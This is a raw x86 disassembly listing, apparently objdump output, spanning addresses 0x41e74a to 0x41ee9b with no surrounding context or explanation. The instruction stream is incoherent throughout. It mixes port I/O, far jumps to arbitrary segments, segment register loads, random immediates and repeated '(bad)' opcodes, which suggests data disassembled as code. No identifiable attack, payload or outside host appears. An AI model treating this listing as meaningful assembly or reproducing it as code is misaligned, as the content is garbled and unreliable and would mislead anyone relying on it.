  41e74a:	in     eax,0x6b
  41e74c:	int    0x99
  41e74e:	add    DWORD PTR [edi],ebx
  41e750:	jno    0x41e769
  41e752:	aas    
  41e753:	sbb    eax,0xed6e30ea
  41e758:	js     0x41e79a
  41e75a:	jnp    0x41e70d
  41e75c:	dec    esi
  41e75d:	mov    ecx,0x590df6ee
  41e762:	in     ax,dx
  41e764:	cmovns eax,DWORD PTR [bx+di+0x1a]
  41e769:	and    edi,DWORD PTR [edi+0x2f815919]
  41e76f:	aam    0x53
  41e771:	test   al,0xfd
  41e773:	jbe    0x41e772
  41e775:	xchg   edx,eax
  41e776:	xchg   eax,esp
  41e778:	mov    eax,0xd25b5803
  41e77d:	dec    edi
  41e77e:	retf   
  41e77f:	aad    0x4e
  41e781:	sbb    dl,cl
  41e783:	cld    
  41e784:	stos   DWORD PTR es:[edi],eax
  41e785:	pop    ds
  41e786:	loopne 0x41e774
  41e788:	in     al,dx
  41e789:	cs cli 
  41e78b:	test   al,0xdc
  41e78d:	cmp    BYTE PTR [esi],cl
  41e78f:	add    al,0xde
  41e791:	cmp    ebp,esp
  41e793:	and    DWORD PTR [ebx+0x13388535],ebp
  41e799:	and    al,0x71
  41e79b:	add    eax,0x932012e5
  41e7a0:	jno    0x41e800
  41e7a2:	enter  0x401a,0xe
  41e7a6:	ret    0x51bc
  41e7a9:	xchg   edx,eax
  41e7aa:	pop    ss
  41e7ab:	inc    ecx
  41e7ac:	or     BYTE PTR [ecx+0x6c],dl
  41e7af:	jmp    0xda5c:0x960ab76f
  41e7b6:	ins    DWORD PTR es:[edi],dx
  41e7b7:	pop    ecx
  41e7b8:	fwait
  41e7b9:	pop    ebx
  41e7ba:	pop    edx
  41e7bb:	mov    esi,DWORD PTR [edi]
  41e7bd:	cwde   
  41e7be:	popa   
  41e7bf:	cld    
  41e7c0:	mov    dl,0x26
  41e7c2:	cmp    al,0xad
  41e7c4:	mov    al,ds:0x35c5e25a
  41e7c9:	cmp    eax,0x7f530abd
  41e7ce:	mov    dh,bl
  41e7d0:	icebp  
  41e7d1:	push   0xaf3d62d8
  41e7d6:	mov    WORD PTR [ebx],ds
  41e7d8:	sbb    BYTE PTR [edi-0x2b],bh
  41e7db:	popf   
  41e7dc:	pusha  
  41e7dd:	loope  0x41e832
  41e7df:	rcr    BYTE PTR [eax+0x3f],1
  41e7e2:	cmp    BYTE PTR [edx+0xf4ab9ba],bl
  41e7e8:	and    BYTE PTR ds:0xe4708b23,cl
  41e7ee:	(bad)  
  41e7ef:	mov    ebx,0x852db138
  41e7f4:	adc    bl,cl
  41e7f6:	in     al,dx
  41e7f7:	pop    edx
  41e7f8:	push   0xffffffcd
  41e7fa:	mov    eax,0x918dec4b
  41e7ff:	cmc    
  41e800:	loopne 0x41e81f
  41e802:	cmp    bl,BYTE PTR [eax-0x46ac3eb2]
  41e808:	pop    ebx
  41e80a:	push   eax
  41e80b:	xchg   esi,eax
  41e80c:	in     al,0x8
  41e80e:	stos   DWORD PTR es:[edi],eax
  41e80f:	into   
  41e810:	clc    
  41e811:	pop    ss
  41e812:	mov    DWORD PTR [ecx+eax*2],eax
  41e815:	push   0x5d
  41e817:	jecxz  0x41e856
  41e819:	std    
  41e81a:	aas    
  41e81b:	shr    DWORD PTR [esi],0xd3
  41e81e:	inc    ebp
  41e81f:	push   edx
  41e820:	(bad)  
  41e821:	mov    eax,0xaf4e299e
  41e826:	lock sbb eax,0xfaf87b46
  41e82c:	int3   
  41e82d:	dec    eax
  41e82e:	fcomp  QWORD PTR [ecx+edx*2-0x4451bbf2]
  41e835:	leave  
  41e836:	push   edx
  41e837:	adc    ch,BYTE PTR [ebx+0x10]
  41e83a:	and    BYTE PTR [edx+0x7],bh
  41e83d:	cdq    
  41e83e:	or     dh,ch
  41e840:	mov    ecx,0x98b0da77
  41e845:	or     BYTE PTR [edx],0xa0
  41e848:	jg     0x41e7fc
  41e84a:	sbb    al,0x50
  41e84c:	jmp    eax
  41e84e:	inc    esp
  41e84f:	mov    ch,0x6
  41e851:	scas   eax,DWORD PTR es:[edi]
  41e852:	ds enter 0x544a,0x8a
  41e857:	push   ebp
  41e858:	imul   ebx,DWORD PTR [ebx+0x22],0x4cc37350
  41e85f:	push   eax
  41e860:	sub    ebx,esi
  41e862:	stos   DWORD PTR es:[edi],eax
  41e863:	jnp    0x41e8e3
  41e865:	mov    ss,WORD PTR [ebx+ebx*1]
  41e868:	sub    BYTE PTR [edx],al
  41e86a:	mov    bl,0x6e
  41e86c:	sub    al,0x6f
  41e86e:	jmp    0x41e82a
  41e870:	xchg   edx,eax
  41e871:	clc    
  41e872:	inc    edi
  41e873:	inc    esp
  41e874:	mov    ds:0xf08abf03,al
  41e879:	push   cs
  41e87a:	pop    ds
  41e87b:	pop    ebx
  41e87c:	push   ecx
  41e87d:	les    esi,FWORD PTR [ecx+ecx*8+0x7a]
  41e881:	pop    edx
  41e882:	(bad)  
  41e883:	adc    DWORD PTR [edi-0x6b2d2889],ebx
  41e889:	sbb    edi,DWORD PTR [esi+eiz*8-0x73d5e445]
  41e890:	push   0xb067252f
  41e895:	loop   0x41e90f
  41e897:	xor    BYTE PTR [eax],ah
  41e899:	out    0x44,al
  41e89b:	test   al,0xa8
  41e89d:	leave  
  41e89e:	and    eax,DWORD PTR [ecx+0x1dbf8752]
  41e8a4:	pop    edi
  41e8a5:	add    al,0xff
  41e8a7:	repnz push 0xffffffdc
  41e8aa:	cmp    al,dl
  41e8ac:	(bad)  
  41e8ad:	in     al,0x1
  41e8af:	retf   0x3258
  41e8b2:	sub    dh,dl
  41e8b4:	jno    0x41e8c4
  41e8b6:	mov    ds,WORD PTR [esi-0x190ad0f5]
  41e8bc:	and    eax,0x576a76bc
  41e8c1:	in     eax,dx
  41e8c2:	in     eax,dx
  41e8c3:	mov    al,ds:0xdeee2df4
  41e8c8:	and    eax,0xb8b31a1d
  41e8cd:	xchg   edx,eax
  41e8ce:	dec    edx
  41e8cf:	adc    DWORD PTR [eax+0x27],edx
  41e8d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8d4:	test   bh,ch
  41e8d6:	adc    DWORD PTR [edi-0x68dd8e70],eax
  41e8dc:	dec    edx
  41e8dd:	jmp    0x34db:0x2507e605
  41e8e4:	cmp    al,dl
  41e8e6:	loop   0x41e8be
  41e8e8:	add    edx,DWORD PTR [eax+0x5b86e11f]
  41e8ee:	ins    DWORD PTR es:[edi],dx
  41e8ef:	arpl   WORD PTR [ebx],di
  41e8f1:	add    BYTE PTR [eax],al
  41e8f3:	cdq    
  41e8f4:	inc    eax
  41e8f5:	dec    ebp
  41e8f6:	sbb    al,BYTE PTR [ebx+0x41]
  41e8f9:	int3   
  41e8fa:	jb     0x41e8cb
  41e8fc:	adc    esi,DWORD PTR [eax-0x3a14492b]
  41e902:	add    DWORD PTR [ebp-0x4b512db],0x58
  41e909:	pop    esp
  41e90a:	sbb    bl,BYTE PTR es:[ecx]
  41e90d:	es dec edi
  41e90f:	pop    edi
  41e910:	fadd   st,st(5)
  41e912:	cmp    ebp,DWORD PTR gs:[edi]
  41e915:	shr    edx,1
  41e917:	adc    eax,0x8cb8be07
  41e91c:	imul   ebp,ebp,0xffffffad
  41e91f:	in     al,0x15
  41e921:	push   edx
  41e922:	test   eax,esi
  41e924:	sbb    al,al
  41e926:	stos   BYTE PTR es:[edi],al
  41e927:	popf   
  41e928:	mov    al,BYTE PTR [ebp+0x40]
  41e92b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e92c:	jo     0x41e8b8
  41e92e:	ja     0x41e991
  41e930:	pop    esi
  41e931:	mov    WORD PTR [eax-0x40],?
  41e934:	dec    edx
  41e935:	push   0xfffffff5
  41e937:	pop    edi
  41e938:	jns    0x41e987
  41e93a:	pushf  
  41e93b:	mov    ebp,0xc33df654
  41e940:	inc    ecx
  41e941:	imul   eax,DWORD PTR [edx+0x57],0xffffff91
  41e945:	or     al,BYTE PTR [ebx-0x57]
  41e948:	pop    ebp
  41e949:	lods   al,BYTE PTR ds:[esi]
  41e94a:	mov    edx,0x78083a51
  41e94f:	xlat   BYTE PTR ds:[ebx]
  41e950:	xchg   esi,eax
  41e951:	mov    DWORD PTR [esi-0x4e72951c],esi
  41e957:	jb     0x41e8dd
  41e959:	jmp    0x41e922
  41e95b:	not    DWORD PTR [edx-0x49549423]
  41e961:	mov    edx,0xd8adfd24
  41e966:	popf   
  41e967:	aas    
  41e968:	scas   eax,DWORD PTR es:[edi]
  41e969:	in     al,dx
  41e96a:	inc    edx
  41e96b:	enter  0x778,0x45
  41e96f:	inc    ebx
  41e970:	push   ebx
  41e971:	call   0x18ba5526
  41e976:	test   eax,0x767fd095
  41e97b:	push   0x6bbf49c0
  41e980:	mov    bh,BYTE PTR [ebp-0x68631d0e]
  41e986:	test   BYTE PTR [eax-0x5c4ed7b3],bh
  41e98c:	sar    DWORD PTR ds:[ebp-0x3],1
  41e990:	jp     0x41e9b2
  41e992:	mov    dl,0xb7
  41e994:	fcomp  DWORD PTR [esi]
  41e996:	(bad)  
  41e998:	into   
  41e999:	cli    
  41e99a:	out    0xd1,eax
  41e99c:	loope  0x41e9dc
  41e99e:	sub    esp,DWORD PTR [esi]
  41e9a0:	je     0x41e97f
  41e9a2:	adc    DWORD PTR [eax+esi*8+0xec0d6bc],edx
  41e9a9:	arpl   ax,bp
  41e9ab:	imul   edi,esi,0xffffffdc
  41e9ae:	sar    BYTE PTR [eax],0x3a
  41e9b1:	jb     0x41e9f7
  41e9b3:	sahf   
  41e9b4:	sbb    esp,DWORD PTR [edi+0x5d6bcdfc]
  41e9ba:	sub    eax,DWORD PTR [esi]
  41e9bc:	push   ds
  41e9bd:	stos   DWORD PTR es:[edi],eax
  41e9be:	inc    edi
  41e9bf:	lods   al,BYTE PTR ds:[esi]
  41e9c0:	ret    0x3851
  41e9c3:	ja     0x41ea2a
  41e9c5:	xor    al,BYTE PTR [edi-0x6c24895]
  41e9cb:	jge    0x41e9fa
  41e9cd:	rcl    DWORD PTR [esi+esi*4-0x4e],0x68
  41e9d2:	hlt    
  41e9d3:	test   cl,dl
  41e9d5:	bound  esp,QWORD PTR [ecx+ecx*2-0x4f44210b]
  41e9dc:	or     eax,0x18b3fe88
  41e9e1:	push   es
  41e9e2:	dec    ebp
  41e9e3:	cwde   
  41e9e4:	jne    0x41ea2b
  41e9e6:	mov    BYTE PTR [edi],ch
  41e9e8:	cmp    eax,0x4b15c93c
  41e9ed:	mov    edi,0x1f108015
  41e9f2:	adc    eax,ebp
  41e9f4:	jle    0x41e9cd
  41e9f6:	add    al,0xe0
  41e9f8:	push   cs
  41e9f9:	jmp    0x9c078784
  41e9fe:	lock xchg edi,eax
  41ea00:	pop    ebx
  41ea01:	xor    eax,0x7d11dd08
  41ea06:	jno    0x41ea77
  41ea08:	inc    BYTE PTR [ecx+0x1d0eb4e6]
  41ea0e:	lds    edi,FWORD PTR [ecx+0x690bd3e]
  41ea14:	dec    ecx
  41ea15:	in     eax,0xce
  41ea17:	stos   BYTE PTR es:[edi],al
  41ea18:	jb     0x41e9dc
  41ea1a:	inc    ebx
  41ea1b:	jl     0x41ea96
  41ea1d:	push   es
  41ea1e:	addr16 hlt 
  41ea20:	shl    BYTE PTR [esi],0x1c
  41ea23:	sub    BYTE PTR [eax+0x6c],bl
  41ea26:	shl    DWORD PTR [esi+0x3ab835d3],0xa5
  41ea2d:	xchg   ecx,eax
  41ea2e:	mov    al,ds:0x3cb428d
  41ea33:	jno    0x41ea6b
  41ea35:	mov    eax,ds:0x7c33c22e
  41ea3a:	loope  0x41e9bc
  41ea3c:	mov    fs,WORD PTR [ebx+0x15ce6241]
  41ea42:	xchg   esi,eax
  41ea43:	push   ebx
  41ea44:	stos   BYTE PTR es:[edi],al
  41ea45:	mov    eax,ds:0x855a81d1
  41ea4a:	out    dx,eax
  41ea4b:	ret    0xacd8
  41ea4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea4f:	hlt    
  41ea50:	popf   
  41ea51:	scas   al,BYTE PTR es:[edi]
  41ea52:	imul   esp,DWORD PTR [ebx-0x4753ae32],0xc9a5b271
  41ea5c:	pop    ds
  41ea5d:	xor    bl,BYTE PTR [edx+0xa]
  41ea60:	js     0x41eabc
  41ea62:	jl     0x41e9ef
  41ea64:	mov    ebx,0xa6af262e
  41ea69:	rsqrtps xmm0,xmm5
  41ea6c:	pushf  
  41ea6d:	fisttp DWORD PTR [ebx+eiz*1-0x1ef2a95b]
  41ea74:	outs   dx,BYTE PTR ds:[esi]
  41ea75:	jbe    0x41ea2c
  41ea77:	push   0xe
  41ea79:	add    BYTE PTR [ecx],dh
  41ea7b:	dec    ebx
  41ea7c:	loopne 0x41ea92
  41ea7e:	das    
  41ea7f:	push   cs
  41ea80:	adc    eax,edx
  41ea82:	mov    esp,0x64698dd1
  41ea87:	(bad)  
  41ea88:	rcr    al,cl
  41ea8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea8b:	and    DWORD PTR [ecx-0x5491f00f],0xffffffa1
  41ea92:	out    dx,eax
  41ea93:	inc    esi
  41ea94:	cmc    
  41ea95:	jp     0x41ea2b
  41ea97:	or     ecx,ecx
  41ea99:	jge    0x41ead4
  41ea9b:	pop    eax
  41ea9c:	cwde   
  41ea9d:	dec    ebx
  41ea9e:	sti    
  41ea9f:	out    dx,eax
  41eaa0:	dec    esp
  41eaa1:	ret    0x7093
  41eaa4:	xchg   esp,eax
  41eaa5:	mov    dl,0xe6
  41eaa7:	xor    DWORD PTR [edi-0x4c],edi
  41eaaa:	in     eax,0xcb
  41eaac:	imul   esp,DWORD PTR [ebx+0x44bd6698],0xee75bd1b
  41eab6:	nop
  41eab7:	pop    ss
  41eab8:	fcom   DWORD PTR [esi+edi*8+0x6f]
  41eabc:	push   edx
  41eabd:	push   edx
  41eabe:	push   eax
  41eabf:	inc    ebp
  41eac0:	pop    es
  41eac1:	jge    0x41eb26
  41eac3:	sub    DWORD PTR [eax+0x24a1f83e],ebp
  41eac9:	test   eax,0x8f253417
  41eace:	dec    edi
  41eacf:	jecxz  0x41eb26
  41ead1:	xor    esi,esi
  41ead3:	shl    DWORD PTR [eax+0x3e],1
  41ead6:	xor    ebp,ecx
  41ead8:	nop
  41ead9:	in     al,dx
  41eada:	rol    DWORD PTR [edx],0x66
  41eadd:	sbb    esi,DWORD PTR [ebx+0x5bd6b0e9]
  41eae3:	mov    al,ds:0x889128db
  41eae8:	hlt    
  41eae9:	dec    edx
  41eaea:	sahf   
  41eaeb:	retf   
  41eaec:	and    BYTE PTR ds:0x34ea77d9,bl
  41eaf2:	dec    esi
  41eaf3:	(bad)  
  41eaf4:	add    ecx,edx
  41eaf6:	xchg   ebp,eax
  41eaf7:	in     eax,0x7c
  41eaf9:	and    al,0x9e
  41eafb:	or     al,0xd
  41eafd:	test   ah,al
  41eaff:	scas   eax,DWORD PTR es:[edi]
  41eb00:	or     ebx,DWORD PTR [ecx+0x47452358]
  41eb06:	mov    ecx,DWORD PTR [ebx+0x36]
  41eb09:	not    ecx
  41eb0b:	clc    
  41eb0c:	pop    ds
  41eb0d:	add    dl,BYTE PTR [ecx]
  41eb0f:	jp     0x41eb3d
  41eb11:	adc    BYTE PTR [esi],cl
  41eb13:	in     al,0xa4
  41eb15:	rcr    DWORD PTR [esi],0x5b
  41eb18:	add    ebx,ecx
  41eb1a:	or     BYTE PTR [ebx],ch
  41eb1c:	inc    edi
  41eb1d:	and    bh,bh
  41eb1f:	sbb    BYTE PTR [esi-0x285b70e5],cl
  41eb25:	adc    eax,0xdd10fb0
  41eb2a:	mov    ebx,DWORD PTR [esp+ecx*4-0x722b1719]
  41eb31:	(bad)  
  41eb32:	std    
  41eb33:	dec    eax
  41eb34:	push   ecx
  41eb35:	push   es
  41eb36:	mov    edi,eax
  41eb38:	adc    BYTE PTR [eax+0x35],0x36
  41eb3c:	and    edx,DWORD PTR [ebx]
  41eb3e:	(bad)  
  41eb40:	sbb    bl,BYTE PTR [ecx-0x34]
  41eb43:	(bad)  
  41eb44:	out    dx,al
  41eb45:	or     al,0xc4
  41eb47:	sahf   
  41eb48:	pop    esp
  41eb49:	loope  0x41ebc2
  41eb4b:	scas   al,BYTE PTR es:[edi]
  41eb4c:	shl    DWORD PTR [ecx],cl
  41eb4e:	std    
  41eb4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb50:	push   esi
  41eb51:	ror    DWORD PTR [edx-0x64ed50c4],cl
  41eb57:	in     al,0xeb
  41eb59:	push   ecx
  41eb5a:	lock sbb BYTE PTR ss:[ebx],bl
  41eb5e:	shr    DWORD PTR [edi],0xab
  41eb61:	mov    eax,ds:0x33e08542
  41eb66:	pop    ebp
  41eb67:	fstp   TBYTE PTR [esi+ebx*8]
  41eb6a:	and    al,0x13
  41eb6c:	into   
  41eb6d:	shr    DWORD PTR [edx],0x1f
  41eb70:	sbb    al,0xaf
  41eb72:	mov    fs,eax
  41eb74:	mov    ecx,0x589a615c
  41eb79:	add    dh,BYTE PTR [ebx-0xf2c6bda]
  41eb7f:	imul   ebp,DWORD PTR [ebx+eiz*2+0x67],0xffffffd2
  41eb84:	lahf   
  41eb85:	repz cli 
  41eb87:	mov    ds:0x41416374,eax
  41eb8c:	hlt    
  41eb8d:	push   ds
  41eb8e:	paddb  mm0,QWORD PTR [edx-0x63]
  41eb92:	shl    BYTE PTR [edx],0x10
  41eb95:	imul   eax,DWORD PTR fs:[edi],0x1cc49489
  41eb9c:	jns    0x41eb37
  41eb9e:	jg     0x41ec1d
  41eba0:	lods   eax,DWORD PTR ds:[esi]
  41eba1:	je     0x41eb5a
  41eba3:	push   es
  41eba4:	and    edx,DWORD PTR [edi+0x1c05c445]
  41ebaa:	shl    ebp,cl
  41ebac:	xchg   edx,eax
  41ebad:	add    al,0xc6
  41ebaf:	iret   
  41ebb0:	sar    esi,cl
  41ebb2:	jl     0x41eb72
  41ebb4:	popa   
  41ebb5:	aas    
  41ebb6:	loopne 0x41eb4d
  41ebb8:	xchg   edx,eax
  41ebb9:	popf   
  41ebba:	jge    0x41ec37
  41ebbc:	sub    DWORD PTR [ecx],ebp
  41ebbe:	scas   al,BYTE PTR es:[edi]
  41ebbf:	jge    0x41ec11
  41ebc1:	cld    
  41ebc2:	out    0x1d,eax
  41ebc4:	jns    0x41eb6e
  41ebc6:	cwde   
  41ebc7:	sub    BYTE PTR [eax],al
  41ebc9:	ins    DWORD PTR es:[edi],dx
  41ebca:	adc    ah,ah
  41ebcc:	mov    ch,0x90
  41ebce:	mov    edi,0x24f9251
  41ebd3:	rcl    DWORD PTR [esi+0x70],1
  41ebd6:	push   ebp
  41ebd7:	pop    edx
  41ebd8:	add    al,0x22
  41ebda:	popf   
  41ebdb:	test   eax,0xd8571af9
  41ebe0:	dec    edi
  41ebe1:	fist   DWORD PTR [eax+0x54e7ead]
  41ebe7:	inc    ebp
  41ebe8:	xchg   DWORD PTR [eax],esp
  41ebea:	js     0x41eb9c
  41ebec:	in     al,dx
  41ebed:	cmp    BYTE PTR [ecx-0x17b6f66a],ah
  41ebf3:	ja     0x41eb8e
  41ebf5:	in     al,0x80
  41ebf7:	cld    
  41ebf8:	cdq    
  41ebf9:	int3   
  41ebfa:	(bad)  
  41ebfb:	jmp    0xb684:0x404609d5
  41ec02:	fiadd  DWORD PTR ds:0xa5d5942
  41ec08:	enter  0x3a31,0xd6
  41ec0c:	xchg   ebp,eax
  41ec0d:	shl    DWORD PTR [eax],0x30
  41ec10:	xor    ecx,DWORD PTR [ecx]
  41ec12:	and    DWORD PTR [ebp+0x3b],esp
  41ec15:	jge    0x41eba1
  41ec17:	call   0xef4c0775
  41ec1c:	sbb    al,0x8d
  41ec1e:	xor    ebx,ebx
  41ec20:	mov    dh,0x5a
  41ec22:	mov    bh,0x88
  41ec24:	mov    DWORD PTR [ecx+eax*4-0x10],edi
  41ec28:	adc    al,0x1
  41ec2a:	dec    edi
  41ec2b:	les    edi,FWORD PTR [edi-0x2caf9c17]
  41ec31:	cmp    esp,DWORD PTR [eax+0x459d5c6b]
  41ec37:	mov    ah,0xd3
  41ec39:	lods   eax,DWORD PTR ds:[esi]
  41ec3a:	ret    0x6019
  41ec3d:	loope  0x41ec64
  41ec3f:	sub    dh,0x19
  41ec42:	xchg   ebx,eax
  41ec43:	cs scas al,BYTE PTR es:[edi]
  41ec45:	and    dh,ch
  41ec47:	scas   al,BYTE PTR es:[edi]
  41ec48:	ret    0xc4e2
  41ec4b:	retf   0xf805
  41ec4e:	rol    dh,1
  41ec50:	pop    es
  41ec51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec52:	push   eax
  41ec53:	inc    edi
  41ec54:	fwait
  41ec55:	jmp    0x827a:0x4b6c46f4
  41ec5c:	add    BYTE PTR [ecx+0x70],cl
  41ec5f:	xor    eax,0x296a68ab
  41ec64:	in     eax,dx
  41ec65:	adc    bh,bh
  41ec67:	test   DWORD PTR [edx-0x20ce5924],esi
  41ec6d:	popa   
  41ec6e:	pushf  
  41ec6f:	shl    bl,0xfc
  41ec72:	out    dx,al
  41ec73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec74:	adc    al,0xd2
  41ec76:	dec    ebx
  41ec77:	cmp    al,0xc2
  41ec79:	out    0x64,al
  41ec7b:	hlt    
  41ec7c:	pop    ss
  41ec7d:	inc    ebp
  41ec7e:	int3   
  41ec7f:	iret   
  41ec80:	pop    es
  41ec81:	fs fs aam 0x57
  41ec85:	call   0x505b6718
  41ec8a:	jno    0x41ec1e
  41ec8c:	repnz ror BYTE PTR [edi+0x7c],1
  41ec90:	and    eax,0x2b30bef4
  41ec95:	mov    edi,0x2396b4d7
  41ec9a:	mov    dl,0x8b
  41ec9c:	or     al,0xc6
  41ec9e:	out    0xab,al
  41eca0:	jmp    0x7d8d:0x9d837c88
  41eca7:	jo     0x41ed0d
  41eca9:	lock and BYTE PTR [esi],dl
  41ecac:	mov    cl,BYTE PTR [esi]
  41ecae:	mov    esp,0x8b914a96
  41ecb3:	inc    edx
  41ecb4:	js     0x41ecfc
  41ecb6:	bound  esp,QWORD PTR [ebp-0x4fbc31c0]
  41ecbc:	jecxz  0x41ec74
  41ecbe:	mov    dl,0x69
  41ecc0:	leave  
  41ecc1:	push   0x72
  41ecc3:	cmp    bh,BYTE PTR [esi+ebp*4]
  41ecc6:	fs cli 
  41ecc8:	inc    edi
  41ecc9:	push   ebx
  41ecca:	loop   0x41ecc0
  41eccc:	out    dx,al
  41eccd:	xchg   ecx,eax
  41ecce:	push   esp
  41eccf:	ja     0x41ed0f
  41ecd1:	sub    ecx,DWORD PTR [esi-0xe11375b]
  41ecd7:	in     eax,0xb7
  41ecd9:	jmp    0x41ec96
  41ecdb:	jo     0x41ecd8
  41ecdd:	div    BYTE PTR [ecx]
  41ecdf:	sub    eax,0x120ab1d1
  41ece4:	imul   ebx,DWORD PTR [ecx+0x20],0xffffffb6
  41ece8:	aam    0xdb
  41ecea:	xor    DWORD PTR ds:[edx+0x7778b701],ebp
  41ecf1:	pushf  
  41ecf2:	sbb    DWORD PTR [ecx-0x57],edi
  41ecf5:	fstp   QWORD PTR [edi-0x1dc893ac]
  41ecfb:	loopne 0x41ed2e
  41ecfd:	push   ebx
  41ecfe:	sub    dl,BYTE PTR ds:[ebp-0x8]
  41ed02:	adc    ebp,ebx
  41ed04:	mov    ds:0xd99b28f5,eax
  41ed09:	ret    0xed6
  41ed0c:	mov    DWORD PTR [ebp-0x3],esp
  41ed0f:	push   0x98f6ca72
  41ed14:	sti    
  41ed15:	sar    DWORD PTR [ecx-0x6d052d1a],cl
  41ed1b:	mov    eax,ds:0xa11dbdec
  41ed20:	mul    BYTE PTR [ebx-0x17223f3f]
  41ed26:	add    edi,DWORD PTR [eax+0xd]
  41ed29:	mov    cl,0xf
  41ed2b:	repz mov ecx,0x335a83cb
  41ed31:	cwde   
  41ed32:	mov    esi,0x52ed83be
  41ed37:	jns    0x41ecd5
  41ed39:	pop    edi
  41ed3a:	daa    
  41ed3b:	xor    bl,bl
  41ed3d:	push   0xffffff82
  41ed3f:	fs pop ss
  41ed41:	sbb    BYTE PTR gs:0x93f14606,ah
  41ed48:	pop    ds
  41ed49:	out    0x56,al
  41ed4b:	dec    edi
  41ed4c:	sub    eax,0xd7d09fd3
  41ed51:	pop    ds
  41ed52:	lock (bad) [esi+0x7baeba83]
  41ed59:	mov    ebx,0xa14bd93c
  41ed5e:	xor    ch,cl
  41ed60:	adc    eax,0xf428d325
  41ed65:	fnstenv [ebp+edi*2-0x30]
  41ed69:	in     eax,0xe
  41ed6b:	adc    eax,0x8d021b71
  41ed70:	jl     0x41ecfc
  41ed72:	and    DWORD PTR [esp+edx*8+0x53],ecx
  41ed76:	fisubr WORD PTR [ebx-0x43]
  41ed79:	es or  eax,0xf969908d
  41ed7f:	arpl   WORD PTR [eax-0x65],bp
  41ed82:	push   esi
  41ed83:	out    0x52,eax
  41ed85:	inc    esi
  41ed86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed87:	push   ss
  41ed88:	xlat   BYTE PTR ds:[ebx]
  41ed89:	add    cl,BYTE PTR [edx]
  41ed8b:	fwait
  41ed8c:	int    0x86
  41ed8e:	jo     0x41edb3
  41ed90:	(bad)  
  41ed91:	in     al,dx
  41ed92:	cmp    cl,0xd4
  41ed95:	jae    0x41edec
  41ed97:	je     0x41edbd
  41ed99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed9a:	leave  
  41ed9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed9c:	pop    edi
  41ed9d:	iret   
  41ed9e:	push   0x725b33b
  41eda3:	add    eax,0xdc1c730f
  41eda8:	pop    edx
  41eda9:	mov    bl,0x6b
  41edab:	mov    esp,DWORD PTR [ecx+0x1c005acf]
  41edb1:	xlat   BYTE PTR ds:[ebx]
  41edb2:	dec    edx
  41edb3:	outs   dx,DWORD PTR ds:[esi]
  41edb4:	test   DWORD PTR [ebx+0x6f],0x764027fd
  41edbb:	adc    dl,BYTE PTR [ecx+0x18a94a83]
  41edc1:	sbb    DWORD PTR [eax+0x58],ebp
  41edc4:	xor    BYTE PTR [ecx],0x71
  41edc7:	push   ecx
  41edc8:	repnz dec ecx
  41edca:	aad    0x2d
  41edcc:	rcl    BYTE PTR [ecx+0x37169b81],cl
  41edd2:	ss pop ss
  41edd4:	mov    ah,0x62
  41edd6:	fstp   QWORD PTR ds:0x4824dc5b
  41eddc:	cwde   
  41eddd:	out    0xbc,al
  41eddf:	dec    esp
  41ede0:	mov    dh,0xdc
  41ede2:	sub    DWORD PTR [ecx-0x3a],ebx
  41ede5:	xchg   BYTE PTR [edx+edi*2+0x66],cl
  41ede9:	sub    ecx,DWORD PTR [eax-0x79]
  41edec:	and    al,0x8f
  41edee:	adc    eax,0xe6a40b90
  41edf3:	mov    cl,0xf0
  41edf5:	mov    edi,0x6d0d6ed4
  41edfa:	hlt    
  41edfb:	pop    ecx
  41edfc:	cmc    
  41edfd:	int    0xe5
  41edff:	jg     0x41ee25
  41ee01:	mov    dh,0xe0
  41ee03:	xlat   BYTE PTR ds:[ebx]
  41ee04:	(bad)  
  41ee05:	lea    ebp,ds:0x1f1ba95f
  41ee0b:	inc    edi
  41ee0c:	int3   
  41ee0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee0e:	inc    eax
  41ee0f:	lock mov ch,0xae
  41ee12:	(bad)  
  41ee13:	jo     0x41edf8
  41ee15:	adc    ebp,DWORD PTR [ecx+esi*2+0x2551162e]
  41ee1c:	push   eax
  41ee1d:	stc    
  41ee1e:	push   ebx
  41ee1f:	push   ecx
  41ee20:	sti    
  41ee21:	test   DWORD PTR [edx+0x32],0xfed0a29d
  41ee28:	sub    cl,ah
  41ee2a:	loopne 0x41ee73
  41ee2c:	jp     0x41eddb
  41ee2e:	xor    eax,0xe174880f
  41ee33:	sub    DWORD PTR [eax-0x4f],ebp
  41ee36:	inc    ebp
  41ee37:	sbb    al,0x1c
  41ee39:	jnp    0x41edd5
  41ee3b:	push   ds
  41ee3c:	adc    esi,DWORD PTR [edx-0x63]
  41ee3f:	das    
  41ee40:	js     0x41edcb
  41ee42:	push   ds
  41ee43:	mov    edi,0x5228da1f
  41ee48:	je     0x41ee75
  41ee4a:	je     0x41ee7e
  41ee4c:	sbb    DWORD PTR [edi],esi
  41ee4e:	mov    edi,0x6200cdb
  41ee53:	cmp    DWORD PTR [ecx-0xd],esi
  41ee56:	push   es
  41ee57:	rcl    BYTE PTR [ecx-0x4d],cl
  41ee5a:	call   FWORD PTR [edi-0x4b]
  41ee5d:	imul   edi,DWORD PTR [ebx-0x21],0x80789478
  41ee64:	mov    dh,0x9d
  41ee66:	scas   al,BYTE PTR es:[edi]
  41ee67:	mov    ecx,0x2f0c947c
  41ee6c:	dec    ecx
  41ee6d:	lea    eax,[ebx+edi*2-0x54]
  41ee71:	popf   
  41ee72:	inc    edx
  41ee73:	push   0x73
  41ee75:	repz pop edx
  41ee77:	lock hlt 
  41ee79:	mov    al,ds:0xa6feac7c
  41ee7e:	imul   esp,DWORD PTR [ebx],0x31
  41ee81:	shl    DWORD PTR [edi-0x4051c1bc],0x83
  41ee88:	lea    esi,ds:0xd9873532
  41ee8e:	nop
  41ee8f:	adc    BYTE PTR [edi+0x11],0xdb
  41ee93:	push   DWORD PTR [edx]
  41ee95:	xchg   ecx,eax
  41ee96:	pop    ecx
  41ee97:	lds    ebp,FWORD PTR [edx+ebx*2-0x5c]
  41ee9b:	dec    ebx
